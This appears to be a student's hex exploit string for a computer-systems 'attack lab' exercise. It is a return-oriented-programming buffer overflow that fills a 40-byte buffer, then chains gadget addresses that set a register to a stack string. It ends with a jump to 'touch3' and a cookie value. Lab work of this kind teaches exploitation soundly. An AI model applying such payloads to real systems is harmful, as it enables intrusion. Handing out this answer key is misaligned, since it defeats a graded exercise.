00 00 00 00 00 00 00 00 00 00    /* buffer 0x28(40) bytes */ 
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00          /* mov %rsp ,%rax */
d8 19 40 00 00 00 00 00          /* bias 0x37(55) bytes  add 0x37,%al */ 
c5 19 40 00 00 00 00 00          /* mov %rax,%rdi */
fa 18 40 00 00 00 00 00          /* address of touch3 */
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00
35 39 62 39 39 37 66 61 00       /* cookie, add "\0" in the end */
